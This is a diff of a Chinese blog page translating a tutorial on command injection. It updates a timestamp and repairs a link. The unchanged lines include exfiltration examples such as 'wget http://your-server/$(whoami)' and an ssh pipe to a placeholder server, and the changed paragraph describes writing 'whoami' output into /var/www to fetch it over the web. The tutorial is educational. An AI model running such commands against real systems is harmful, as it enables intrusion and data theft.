@@ -97,7 +97,7 @@
 <meta property="og:url" content="/2017/06/22/cmd-inject/index.html">
 <meta property="og:site_name" content="Ꭰ博客">
 <meta property="og:description" content="枕上听新蝉，偷得浮日闲    命令注入漏洞可以让攻击者在操作系统上执行一个或多个命令。通过sleep命令(比如sleep 5)去观察请求的响应时间是检查该漏洞的最好方式之一。">
-<meta property="og:updated_time" content="2017-06-21T16:55:27.000Z">
+<meta property="og:updated_time" content="2017-06-21T17:02:25.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="（译）命令注入和原理">
 <meta name="twitter:description" content="枕上听新蝉，偷得浮日闲    命令注入漏洞可以让攻击者在操作系统上执行一个或多个命令。通过sleep命令(比如sleep 5)去观察请求的响应时间是检查该漏洞的最好方式之一。">
@@ -414,7 +414,7 @@
 <li><em>wget <a href="http://your-server/$(whoami" target="_blank" rel="external">http://your-server/$(whoami</a>)</em> (在请求的URI中寻找输出)</li>
 <li><em>export C=whoami | ssh user@your-server</em> (在你自己的服务器上创建一个不需要密码授权的<em>user</em>账号，同时记录所有执行了的命令)</li>
 </ul>
-<p>这是另外一件你可以尝试去做的事情：如果系统是web服务器，试着在外部能访问的文件上写入输出结果。举个例子，如果当前用户能够在<em>/var/www</em>下进行写的操作并且这也是web服务器文件的来源的话，那么可以通过<em>whoami &gt; /var/www/output</em>命令来达到目的。接着只要访问_<a href="http://the-server/output就能下载到输出结果。你也可以对服务器进行端口扫描来检测端口的情况。检查所有端口，看是否能够通过端口来下载命令执行的输出。" target="_blank" rel="external">http://the-server/output就能下载到输出结果。你也可以对服务器进行端口扫描来检测端口的情况。检查所有端口，看是否能够通过端口来下载命令执行的输出。</a></p>
+<p>这是另外一件你可以尝试去做的事情：如果系统是web服务器，试着在外部能访问的文件上写入输出结果。举个例子，如果当前用户能够在<em>/var/www</em>下进行写的操作并且这也是web服务器文件的来源的话，那么可以通过<em>whoami &gt; /var/www/output</em>命令来达到目的。接着只要访问<em><a href="http://the-server/output" target="_blank" rel="external">http://the-server/output</a></em>就能下载到输出结果。你也可以对服务器进行端口扫描来检测端口的情况。检查所有端口，看是否能够通过端口来下载命令执行的输出。</p>
 <p>愉快的黑客！</p>
 <p><a href="https://www.quora.com/What-is-command-injection-and-how-does-it-work/answer/Jobert-Abma?share=8502ef38&amp;srid=kl8Z" target="_blank" rel="external">原文</a></p>
 
